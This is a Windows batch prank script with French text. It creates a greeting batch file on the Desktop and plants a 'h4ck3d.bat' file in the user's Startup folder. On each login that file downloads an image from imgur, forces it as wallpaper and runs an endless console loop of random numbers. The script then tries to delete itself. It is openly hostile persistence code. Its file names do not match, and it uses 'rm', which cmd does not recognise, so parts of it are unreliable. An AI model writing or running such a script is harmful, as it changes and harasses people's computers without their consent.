@echo off
color 2
set a=%~dp0
cls
cd C:\Users\%username%\Desktop
echo @echo off >> SALUT.bat
echo color 2 >> SALUT.bat
echo cls >> SALUT.bat
echo echo Salut %username% bien ou quoi ? :P >> SALUT.bat
echo pause >> SALUT.bat
start SALUT.bat
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
echo start /MIN powershell iwr -Uri https://i.imgur.com/Ua5Df01.jpg -OutFile c:\windows\temp\b.jpg;sp 'HKCU:Control Panel\Desktop' WallPaper 'c:\windows\temp\b.jpg';$a=1;do{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}while($a++-le59) >> h4ck3d.bat
echo :start >> h4ck3d.bat
echo echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> h4ck3d.bat
echo goto start >> h4ck3d.bat
start h4ch3d.bat
cd %a%
rm h4x0r3d.bat